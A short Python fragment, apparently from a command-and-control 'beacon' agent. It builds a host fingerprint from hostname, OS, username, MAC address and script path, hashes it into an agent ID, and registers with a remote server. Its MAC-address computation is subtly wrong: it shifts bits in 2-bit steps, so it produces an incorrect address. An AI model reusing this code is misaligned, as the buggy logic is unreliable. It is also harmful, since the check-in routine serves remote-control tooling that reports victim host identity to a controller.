    # Registration methods - Added to PythonBeacon class

    def generate_agent_id(self):
        """Generate unique agent ID based on system information"""
        system_info = f"{platform.node()}{platform.system()}"

        # Add username (with fallback)
        try:
            username = os.getlogin()
        except:
            try:
                username = os.environ.get('USER', os.environ.get('USERNAME', 'unknown'))
            except:
                username = 'unknown'
        system_info += username

        # Add MAC address
        try:
            mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff)
                          for elements in range(0, 2*6, 2)][::-1])
            system_info += mac
        except:
            pass

        # Add script path
        system_info += os.path.abspath(__file__)

        # Generate hash
        return hashlib.md5(system_info.encode()).hexdigest()[:8]

    def register(self):
        """Register beacon with server"""
        message = f"register|{self.agent_id}|{self.computer_name}|{self.schema_file}"
        self.log(f"Attempting registration with message: {message}")
        response = self.send_message(message)
        self.log(f"Registration response: {response}")
        return response
